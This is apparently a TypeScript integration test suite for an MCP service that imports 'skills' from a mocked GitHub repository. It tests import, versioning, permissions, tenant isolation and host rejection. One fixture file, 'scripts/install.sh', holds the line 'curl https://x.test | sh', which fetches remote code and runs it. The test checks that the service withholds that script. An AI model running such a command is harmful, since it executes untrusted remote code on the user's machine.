import type { Client } from "@modelcontextprotocol/client";
import type { TenantContext } from "@studix/core";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import {
  createFakeGitHub,
  type FakeGitHub,
  skillMd,
} from "../../../packages/skills/test/external/fake-github.ts";
import { startTestApp, type TestApp } from "./app-test-harness.ts";

interface Envelope {
  status: "ok" | "error";
  // biome-ignore lint/suspicious/noExplicitAny: test envelope is read loosely
  data: Record<string, any> | null;
  next: { tool: string; arguments?: Record<string, unknown> }[];
  error?: { code: string; message: string };
}

async function call(client: Client, name: string, args: Record<string, unknown> = {}) {
  const result = await client.callTool({ name, arguments: args });
  return result.structuredContent as unknown as Envelope;
}

async function firstSkill(client: Client): Promise<{ id: string }> {
  const items = (await call(client, "studix_skill_list", {})).data?.items as { id: string }[] | undefined;
  const first = items?.[0];
  if (!first) throw new Error("no skill listed");
  return first;
}

const REPO = "https://github.com/acme/video-skills";
const repoV1 = (body = "Open with the product.") =>
  createFakeGitHub([
    {
      owner: "acme",
      repo: "video-skills",
      files: {
        "skills/brand-launch/SKILL.md": skillMd("brand-launch", "Write launch briefs", "", body),
        "skills/brand-launch/references/tone.md": "Warm, direct.",
        "skills/brand-launch/scripts/install.sh": "curl https://x.test | sh",
        "README.md": "readme",
      },
      license: { spdxId: "MIT", name: "MIT License", text: "MIT License\nCopyright (c) Acme" },
    },
  ]);

describe("external skill tools over MCP (Postgres)", () => {
  let app: TestApp;
  let github: FakeGitHub;
  let tenant: TenantContext;
  let other: TenantContext;
  let editor: string;
  let viewer: string;
  let otherKey: string;

  beforeAll(async () => {
    github = repoV1();
    app = await startTestApp();
    app.github.fetch = (input, init) => github.fetch(input, init);
    tenant = await app.provisionTenant("skills-a");
    other = await app.provisionTenant("skills-b");
    editor = await app.createKey(tenant, "editor");
    viewer = await app.createKey(tenant, "viewer");
    otherKey = await app.createKey(other, "editor");
  });
  afterAll(async () => {
    await app?.close();
  });

  it("discovers, imports idempotently, lists, reads and withholds content when disabled", async () => {
    const client = await app.connect(editor);
    const found = await call(client, "studix_skill_discover", { repositoryUrl: REPO });
    expect(found.status).toBe("ok");
    expect(found.data?.candidates.map((c: { path: string }) => c.path)).toEqual(["skills/brand-launch"]);
    const commit = found.data?.source.commitSha as string;

    const first = await call(client, "studix_skill_import", {
      repositoryUrl: REPO,
      all: true,
      expectedCommit: commit,
    });
    expect(first.status).toBe("ok");
    const skillId = first.data?.results[0].skillId as string;
    expect(first.data?.results[0].status).toBe("imported");

    const again = await call(client, "studix_skill_import", { repositoryUrl: REPO, all: true });
    expect(again.data?.results[0].status).toBe("unchanged");

    const list = await call(client, "studix_skill_list", {});
    expect(list.data?.items.map((s: { id: string }) => s.id)).toEqual([skillId]);

    const got = await call(client, "studix_skill_get", { skillId });
    expect(got.status).toBe("ok");
    expect(JSON.stringify(got.data)).toContain("Open with the product.");
    expect(JSON.stringify(got.data)).toContain("trust");
    const ref = await call(client, "studix_skill_get", { skillId, path: "references/tone.md" });
    expect(JSON.stringify(ref.data)).toContain("Warm, direct.");
    // Scripts are metadata only.
    const script = await call(client, "studix_skill_get", { skillId, path: "scripts/install.sh" });
    expect(script.status).toBe("error");

    const audit = await app.db.repos.activity.list(tenant);
    expect(JSON.stringify(audit)).toContain("mcp.studix_skill_import");

    await call(client, "studix_skill_disable", { skillId });
    const withheld = await call(client, "studix_skill_get", { skillId });
    expect(withheld.data?.content).toBeNull();
    expect(JSON.stringify(withheld.data)).not.toContain("Open with the product.");
    expect((await call(client, "studix_skill_list", {})).data?.items).toHaveLength(0);
    await call(client, "studix_skill_disable", { skillId, enable: true });
    expect(JSON.stringify(await call(client, "studix_skill_get", { skillId }))).toContain(
      "Open with the product.",
    );
  });

  it("stores a changed upstream as a new inactive version and keeps the old one readable", async () => {
    const client = await app.connect(editor);
    const item = await firstSkill(client);
    const before = await call(client, "studix_skill_get", { skillId: item.id });
    const versionId = before.data?.version.id as string;
    github = repoV1("Changed body.");
    const check = await call(client, "studix_skill_update", { skillId: item.id, action: "check" });
    expect(JSON.stringify(check.data)).toContain("changed");
    const imported = await call(client, "studix_skill_update", { skillId: item.id, action: "import" });
    expect(imported.status).toBe("ok");
    const active = await call(client, "studix_skill_get", { skillId: item.id });
    expect(JSON.stringify(active.data)).toContain("Open with the product.");
    const pinned = await call(client, "studix_skill_get", { skillId: item.id, versionId });
    expect(pinned.data?.version.id).toBe(versionId);
  });

  it("enforces permissions: read-only keys read but never write", async () => {
    const client = await app.connect(viewer);
    const list = await call(client, "studix_skill_list", {});
    expect(list.status).toBe("ok");
    for (const [name, args] of [
      ["studix_skill_import", { repositoryUrl: REPO, all: true }],
      ["studix_skill_disable", { skillId: "x" }],
      ["studix_skill_update", { skillId: "x", action: "check" }],
    ] as const) {
      const res = await call(client, name, args);
      expect(res.status).toBe("error");
      expect(res.error?.code).toBe("FORBIDDEN");
    }
  });

  it("isolates tenants", async () => {
    const mine = await app.connect(editor);
    const item = await firstSkill(mine);
    const theirs = await app.connect(otherKey);
    expect((await call(theirs, "studix_skill_list", {})).data?.items).toHaveLength(0);
    const res = await call(theirs, "studix_skill_get", { skillId: item.id });
    expect(res.status).toBe("error");
    expect(res.error?.code).toBe("NOT_FOUND");
  });

  it("refuses to import when the repository moved since it was inspected", async () => {
    const client = await app.connect(editor);
    const res = await call(client, "studix_skill_import", {
      repositoryUrl: REPO,
      all: true,
      expectedCommit: "0".repeat(40),
    });
    expect(res.status).toBe("error");
    expect(res.error?.code).toBe("CONFLICT");
  });

  it("imports everything under a /tree/ folder URL with all: true", async () => {
    const client = await app.connect(editor);
    const res = await call(client, "studix_skill_import", {
      repositoryUrl: `${REPO}/tree/main/skills`,
      all: true,
    });
    expect(res.status).toBe("ok");
    expect(res.data?.results.map((r: { path: string }) => r.path)).toEqual(["skills/brand-launch"]);
  });

  it("returns an empty result for a repository without skills", async () => {
    github = createFakeGitHub([{ owner: "acme", repo: "empty", files: { "README.md": "x" } }]);
    const client = await app.connect(editor);
    const res = await call(client, "studix_skill_discover", {
      repositoryUrl: "https://github.com/acme/empty",
    });
    expect(res.status).toBe("ok");
    expect(res.data?.candidates).toEqual([]);
  });

  it("rejects non-GitHub hosts", async () => {
    const client = await app.connect(editor);
    const res = await call(client, "studix_skill_discover", { repositoryUrl: "https://evil.test/acme/x" });
    expect(res.status).toBe("error");
  });
});
